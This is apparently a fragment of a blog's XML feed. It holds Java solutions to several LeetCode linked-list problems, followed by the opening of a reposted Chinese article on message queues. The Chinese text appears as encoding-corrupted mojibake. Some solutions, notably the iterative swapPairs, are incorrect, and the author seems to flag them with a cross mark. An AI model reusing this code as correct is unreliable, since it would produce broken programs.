class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;cnt;i++)&#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;k-<span class="number">1</span>;j++)&#123;</span><br><span class="line">               l2=l2.next;</span><br><span class="line">           &#125;           </span><br><span class="line">           ListNode next=l2.next;</span><br><span class="line">           ListNode tmp=l1;</span><br><span class="line">           l2.next=<span class="literal">null</span>;</span><br><span class="line">           reverse(tmp);</span><br><span class="line">           l1.next=next;</span><br><span class="line">           root.next=l2;</span><br><span class="line">            root=l1;</span><br><span class="line">           l1=next;</span><br><span class="line">           l2=next;</span><br><span class="line">          </span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> dummy.next;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">count</span><span class="params">(ListNode head,<span class="type">int</span> res)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">       <span class="keyword">return</span> count(head.next,res+<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(ListNode head)</span>&#123;</span><br><span class="line">       ListNode root=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">       <span class="keyword">while</span>(head!=<span class="literal">null</span>)&#123;</span><br><span class="line">           ListNode next=head.next;</span><br><span class="line">           head.next=root.next;</span><br><span class="line">           root.next=head;</span><br><span class="line">           head=next;</span><br><span class="line">       &#125;   </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="è¿›é˜¶è§£æ³•">è¿›é˜¶è§£æ³•</span></h1><h2><span id="24-swap-nodes-in-pairs">24. Swap Nodes in Pairs Ã—</span></h2><p>Given a linked list, swap every two adjacent nodes and return its head.</p><p>You may <strong>not</strong> modify the values in the listâ€™s nodes, only nodes itself may be changed. </p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Given 1-&gt;2-&gt;3-&gt;4, you should return the list as 2-&gt;1-&gt;4-&gt;3.</span><br></pre></td></tr></table></figure><ul><li><p>å¾ªç¯è§£æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">res</span> <span class="operator">=</span> head.next;</span><br><span class="line">    ListNode first=head,second=head.next;</span><br><span class="line">    <span class="keyword">while</span>(first!=<span class="literal">null</span>&amp;&amp;first.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> first.next;</span><br><span class="line">        first.next=first.next.next;</span><br><span class="line">  </span><br><span class="line">        tmp.next=first;</span><br><span class="line">        first=first.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>é€’å½’è§£æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((head == <span class="literal">null</span>)||(head.next == <span class="literal">null</span>))</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">n</span> <span class="operator">=</span> head.next;</span><br><span class="line">        head.next = swapPairs(head.next.next);</span><br><span class="line">        n.next = head;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="725-split-linked-list-in-parts">725. Split Linked List in Parts â€”</span></h2><p>é¢˜ç›®æè¿°ï¼šæŠŠé“¾è¡¨åˆ†éš”æˆ k éƒ¨åˆ†ï¼Œæ¯éƒ¨åˆ†çš„é•¿åº¦éƒ½åº”è¯¥å°½å¯èƒ½ç›¸åŒï¼Œæ’åœ¨å‰é¢çš„é•¿åº¦åº”è¯¥å¤§äºç­‰äºåé¢çš„ã€‚</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">root = [1, 2, 3], k = 5</span><br><span class="line">Output: [[1],[2],[3],[],[]]</span><br><span class="line">Explanation:</span><br><span class="line">The input and each element of the output are ListNodes, not arrays.</span><br><span class="line">For example, the input root has root.val = 1, root.next.val = 2, root.next.next.val = 3, and root.next.next.next = null.</span><br><span class="line">The first element output[0] has output[0].val = 1, output[0].next = null.</span><br><span class="line">The last element output[4] is null, but it&#x27;s string representation as a ListNode is [].</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line">root = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10], k = 3</span><br><span class="line">Output: [[1, 2, 3, 4], [5, 6, 7], [8, 9, 10]]</span><br><span class="line">Explanation:</span><br><span class="line">The input has been split into consecutive parts with size difference at most 1, and earlier parts are a larger size than the later parts.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode[] splitListToParts(ListNode root, <span class="type">int</span> k) &#123;</span><br><span class="line">        ListNode head=root;</span><br><span class="line">        <span class="type">int</span> n=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="literal">null</span>)&#123;</span><br><span class="line">            head=head.next;</span><br><span class="line">            n++;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode[] res = <span class="keyword">new</span> <span class="title class_">ListNode</span>[k];</span><br><span class="line">        <span class="type">int</span> <span class="variable">mod</span> <span class="operator">=</span> n%k;</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> n/k;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;root!=<span class="literal">null</span>&amp;&amp;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> size+(mod--&gt;<span class="number">0</span>?<span class="number">1</span>:<span class="number">0</span>);</span><br><span class="line">            res[i]=root;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;cnt;j++) root=root.next;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> root.next;</span><br><span class="line">            root.next=<span class="literal">null</span>;</span><br><span class="line">            root=next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="328-odd-even-linked-list">328. Odd Even Linked List Ã—</span></h2><p>Given a singly linked list, group all odd nodes together followed by the even nodes. Please note here we are talking about the node number and not the value in the nodes.</p><p>You should try to do it in place. The program should run in O(1) space complexity and O(nodes) time complexity.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</span><br><span class="line">Output: 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 2-&gt;1-&gt;3-&gt;5-&gt;6-&gt;4-&gt;7-&gt;NULL</span><br><span class="line">Output: 2-&gt;3-&gt;6-&gt;7-&gt;1-&gt;5-&gt;4-&gt;NULL</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">oddEvenList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">odd</span> <span class="operator">=</span> head, even = head.next, evenHead = even;</span><br><span class="line">    <span class="keyword">while</span> (even != <span class="literal">null</span> &amp;&amp; even.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        odd.next = odd.next.next;</span><br><span class="line">        odd = odd.next;</span><br><span class="line">        even.next = even.next.next;</span><br><span class="line">        even = even.next;</span><br><span class="line">    &#125;</span><br><span class="line">    odd.next = evenHead;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="61-rotate-list">61. Rotate List âˆš</span></h2><p>Given a linked list, rotate the list to the right by <em>k</em> places, where <em>k</em> is non-negative.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, k = 2</span><br><span class="line">Output: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL</span><br><span class="line">Explanation:</span><br><span class="line">rotate 1 steps to the right: 5-&gt;1-&gt;2-&gt;3-&gt;4-&gt;NULL</span><br><span class="line">rotate 2 steps to the right: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: <span class="number">0</span>-&gt;<span class="number">1</span>-&gt;<span class="number">2</span>-&gt;NULL, k = <span class="number">4</span></span><br><span class="line">Output: <span class="number">2</span>-&gt;<span class="number">0</span>-&gt;<span class="number">1</span>-&gt;NULL</span><br><span class="line">Explanation:</span><br><span class="line">rotate <span class="number">1</span> steps to the right: <span class="number">2</span>-&gt;<span class="number">0</span>-&gt;<span class="number">1</span>-&gt;NULL</span><br><span class="line">rotate <span class="number">2</span> steps to the right: <span class="number">1</span>-&gt;<span class="number">2</span>-&gt;<span class="number">0</span>-&gt;NULL</span><br><span class="line">rotate <span class="number">3</span> steps to the right: <span class="number">0</span>-&gt;<span class="number">1</span>-&gt;<span class="number">2</span>-&gt;NULL</span><br><span class="line">rotate <span class="number">4</span> steps to the right: <span class="number">2</span>-&gt;<span class="number">0</span>-&gt;<span class="number">1</span>-&gt;NULL</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">rotateRight</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">null</span>||head.next==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">       <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> count(head,<span class="number">0</span>);</span><br><span class="line">       k = k%len; </span><br><span class="line">       <span class="keyword">if</span>(k==<span class="number">0</span>) <span class="keyword">return</span> head;</span><br><span class="line">       ListNode fast=head,slow=head;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;k;i++)&#123;</span><br><span class="line">           fast=fast.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">while</span>(fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">           fast=fast.next;</span><br><span class="line">           slow=slow.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">res</span> <span class="operator">=</span> slow.next;</span><br><span class="line">       slow.next=<span class="literal">null</span>;</span><br><span class="line">       </span><br><span class="line">       fast.next=head;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">count</span><span class="params">(ListNode head,<span class="type">int</span> k)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> k;</span><br><span class="line">       <span class="keyword">return</span> count(head.next,k+<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="148-sort-list">148. Sort List Ã—</span></h2><p>Sort a linked list in <em>O</em>(<em>n</em> log <em>n</em>) time using constant space complexity.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 4-&gt;2-&gt;1-&gt;3</span><br><span class="line">Output: 1-&gt;2-&gt;3-&gt;4</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: -1-&gt;5-&gt;3-&gt;4-&gt;0</span><br><span class="line">Output: -1-&gt;0-&gt;3-&gt;4-&gt;5</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">sortList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">null</span>||head.next==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">       ListNode pre=<span class="literal">null</span>,slow=head,fast=head;</span><br><span class="line">       <span class="keyword">while</span>(fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">           pre=slow;</span><br><span class="line">           slow=slow.next;</span><br><span class="line">           fast=fast.next.next;</span><br><span class="line">       &#125;</span><br><span class="line">       pre.next=<span class="literal">null</span>;</span><br><span class="line">       ListNode l1=sortList(head);</span><br><span class="line">       ListNode l2=sortList(slow);</span><br><span class="line">       <span class="keyword">return</span> merge(l1,l2);</span><br><span class="line">   &#125;</span><br><span class="line">   ListNode <span class="title function_">merge</span><span class="params">(ListNode l1,ListNode l2)</span>&#123;</span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>),p=l;</span><br><span class="line">       <span class="keyword">while</span>(l1!=<span class="literal">null</span>&amp;&amp;l2!=<span class="literal">null</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(l1.val&gt;l2.val)&#123;</span><br><span class="line">               p.next=l2;</span><br><span class="line">               l2=l2.next;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               p.next=l1;</span><br><span class="line">               l1=l1.next;</span><br><span class="line">           &#125;</span><br><span class="line">           p=p.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(l1!=<span class="literal">null</span>) p.next=l1;</span><br><span class="line">       <span class="keyword">if</span>(l2!=<span class="literal">null</span>) p.next=l2;</span><br><span class="line">       <span class="keyword">return</span> l.next;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="138-copy-list-with-random-pointer">138. Copy List with Random Pointer âˆš</span></h2><p>A linked list is given such that each node contains an additional random pointer which could point to any node in the list or null.</p><p>Return a <a href="https://en.wikipedia.org/wiki/Object_copying#Deep_copy"><strong>deep copy</strong></a> of the list.</p><p>The Linked List is represented in the input&#x2F;output as a list of <code>n</code> nodes. Each node is represented as a pair of <code>[val, random_index]</code> where:</p><ul><li><code>val</code>: an integer representing <code>Node.val</code></li><li><code>random_index</code>: the index of the node (range from <code>0</code> to <code>n-1</code>) where random pointer points to, or <code>null</code> if it does not point to any node.</li></ul><p><strong>Example 1:</strong></p><p><img src="https://assets.leetcode.com/uploads/2019/12/18/e1.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: head = [[7,null],[13,0],[11,4],[10,2],[1,0]]</span><br><span class="line">Output: [[7,null],[13,0],[11,4],[10,2],[1,0]]</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><p><img src="https://assets.leetcode.com/uploads/2019/12/18/e2.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: head = [[1,1],[2,1]]</span><br><span class="line">Output: [[1,1],[2,1]]</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æŒ‰ç€3æ­¥èµ°å°±è¡Œäº†</p><ol><li><p>éå†ä¸€æ¬¡é“¾è¡¨ï¼Œå°†é“¾è¡¨å¤åˆ¶ä¸€æ¬¡ï¼š</p><p>1-&gt;2-&gt;3   å˜æˆ  1-&gt;1-&gt;2-&gt;2-&gt;3-&gt;3</p></li><li><p>å°†åŸæœ‰çš„randomæŒ‡é’ˆèµ‹äºˆæ–°å»ºçš„é›†åˆï¼Œæ–°é›†åˆçš„randomæŒ‡é’ˆæŒ‡å‘åŸæœ‰é›†åˆrandomçš„next</p></li><li><p>å°†é“¾è¡¨åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Node <span class="title function_">copyRandomList</span><span class="params">(Node head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">    Node phead=head;</span><br><span class="line">    <span class="keyword">while</span>(phead!=<span class="literal">null</span>)&#123;</span><br><span class="line">        Node next=phead.next;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(phead.val);</span><br><span class="line">        phead.next=tmp;</span><br><span class="line">        tmp.next=next;</span><br><span class="line">        phead=next;</span><br><span class="line">    &#125;</span><br><span class="line">    phead=head;</span><br><span class="line">    <span class="keyword">while</span>(phead!=<span class="literal">null</span>)&#123;</span><br><span class="line">        Node next=phead.next;</span><br><span class="line">        Node r=phead.random;</span><br><span class="line">        <span class="keyword">if</span>(r!=<span class="literal">null</span>)&#123;</span><br><span class="line">            next.random=r.next;</span><br><span class="line">        &#125;            </span><br><span class="line">        phead=next.next;</span><br><span class="line">    &#125;</span><br><span class="line">    phead=head;</span><br><span class="line">    Node res=head.next;</span><br><span class="line">    <span class="keyword">while</span>(phead!=<span class="literal">null</span>&amp;&amp;phead.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">        Node next=phead.next;</span><br><span class="line">        phead.next=next.next;</span><br><span class="line">        phead=next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é“¾è¡¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ºä»€ä¹ˆä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ã€è½¬ã€‘</title>
      <link href="/2020/03/22/queue-0/"/>
      <url>/2020/03/22/queue-0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ä¸ºä»€ä¹ˆä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ï¼Ÿ<br>æ¶ˆæ¯é˜Ÿåˆ—æœ‰ä»€ä¹ˆä¼˜ç‚¹å’Œç¼ºç‚¹ï¼Ÿ<br>Kafkaã€ActiveMQã€RabbitMQã€RocketMQ éƒ½æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œä»¥åŠé€‚åˆå“ªäº›åœºæ™¯ï¼Ÿ<br> <span id="more"></span></p><!-- toc --><ul><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98">é¢è¯•é¢˜</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97">ä¸ºä»€ä¹ˆä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—</a><ul><li><a href="#%E8%A7%A3%E8%80%A6">è§£è€¦</a></li><li><a href="#%E5%BC%82%E6%AD%A5">å¼‚æ­¥</a></li><li><a href="#%E5%89%8A%E5%B3%B0">å‰Šå³°</a></li></ul></li><li><a href="#%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E7%BC%BA%E7%82%B9">æ¶ˆæ¯é˜Ÿåˆ—æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹</a></li><li><a href="#kafka-activemq-rabbitmq-rocketmq-%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E7%BC%BA%E7%82%B9">Kafkaã€ActiveMQã€RabbitMQã€RocketMQ æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ</a></li></ul></li></ul><!-- tocstop --><h2><span id="é¢è¯•é¢˜">é¢è¯•é¢˜</span></h2><ul><li>ä¸ºä»€ä¹ˆä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ï¼Ÿ</li><li>æ¶ˆæ¯é˜Ÿåˆ—æœ‰ä»€ä¹ˆä¼˜ç‚¹å’Œç¼ºç‚¹ï¼Ÿ</li><li>Kafkaã€ActiveMQã€RabbitMQã€RocketMQ éƒ½æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œä»¥åŠé€‚åˆå“ªäº›åœºæ™¯ï¼Ÿ</li></ul><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>å…¶å®é¢è¯•å®˜ä¸»è¦æ˜¯æƒ³çœ‹çœ‹ï¼š</p><ul><li><p><strong>ç¬¬ä¸€</strong>ï¼Œä½ çŸ¥ä¸çŸ¥é“ä½ ä»¬ç³»ç»Ÿé‡Œä¸ºä»€ä¹ˆè¦ç”¨æ¶ˆæ¯é˜Ÿåˆ—è¿™ä¸ªä¸œè¥¿ï¼Ÿ<br><br>ä¸å°‘å€™é€‰äººï¼Œè¯´è‡ªå·±é¡¹ç›®é‡Œç”¨äº† Redisã€MQï¼Œä½†æ˜¯å…¶å®ä»–å¹¶ä¸çŸ¥é“è‡ªå·±ä¸ºä»€ä¹ˆè¦ç”¨è¿™ä¸ªä¸œè¥¿ã€‚å…¶å®è¯´ç™½äº†ï¼Œå°±æ˜¯ä¸ºäº†ç”¨è€Œç”¨ï¼Œæˆ–è€…æ˜¯åˆ«äººè®¾è®¡çš„æ¶æ„ï¼Œä»–ä»å¤´åˆ°å°¾éƒ½æ²¡æ€è€ƒè¿‡ã€‚<br><br>æ²¡æœ‰å¯¹è‡ªå·±çš„æ¶æ„é—®è¿‡ä¸ºä»€ä¹ˆçš„äººï¼Œä¸€å®šæ˜¯å¹³æ—¶æ²¡æœ‰æ€è€ƒçš„äººï¼Œé¢è¯•å®˜å¯¹è¿™ç±»å€™é€‰äººå°è±¡é€šå¸¸å¾ˆä¸å¥½ã€‚å› ä¸ºé¢è¯•å®˜æ‹…å¿ƒä½ è¿›äº†å›¢é˜Ÿä¹‹ååªä¼šæœ¨å¤´æœ¨è„‘çš„å¹²å‘†æ´»å„¿ï¼Œä¸ä¼šè‡ªå·±æ€è€ƒã€‚</p></li><li><p><strong>ç¬¬äºŒ</strong>ï¼Œä½ æ—¢ç„¶ç”¨äº†æ¶ˆæ¯é˜Ÿåˆ—è¿™ä¸ªä¸œè¥¿ï¼Œä½ çŸ¥ä¸çŸ¥é“ç”¨äº†æœ‰ä»€ä¹ˆå¥½å¤„&amp;åå¤„ï¼Ÿ<br><br>ä½ è¦æ˜¯æ²¡è€ƒè™‘è¿‡è¿™ä¸ªï¼Œé‚£ä½ ç›²ç›®å¼„ä¸ª MQ è¿›ç³»ç»Ÿé‡Œï¼Œåé¢å‡ºäº†é—®é¢˜ä½ æ˜¯ä¸æ˜¯å°±è‡ªå·±æºœäº†ç»™å…¬å¸ç•™å‘ï¼Ÿä½ è¦æ˜¯æ²¡è€ƒè™‘è¿‡å¼•å…¥ä¸€ä¸ªæŠ€æœ¯å¯èƒ½å­˜åœ¨çš„å¼Šç«¯å’Œé£é™©ï¼Œé¢è¯•å®˜æŠŠè¿™ç±»å€™é€‰äººæ‹›è¿›æ¥äº†ï¼ŒåŸºæœ¬å¯èƒ½å°±æ˜¯æŒ–å‘å‹é€‰æ‰‹ã€‚å°±æ€•ä½ å¹² 1 å¹´æŒ–ä¸€å †å‘ï¼Œè‡ªå·±è·³æ§½äº†ï¼Œç»™å…¬å¸ç•™ä¸‹æ— ç©·åæ‚£ã€‚</p></li><li><p><strong>ç¬¬ä¸‰</strong>ï¼Œæ—¢ç„¶ä½ ç”¨äº† MQï¼Œå¯èƒ½æ˜¯æŸä¸€ç§ MQï¼Œé‚£ä¹ˆä½ å½“æ—¶åšæ²¡åšè¿‡è°ƒç ”ï¼Ÿ<br><br>ä½ 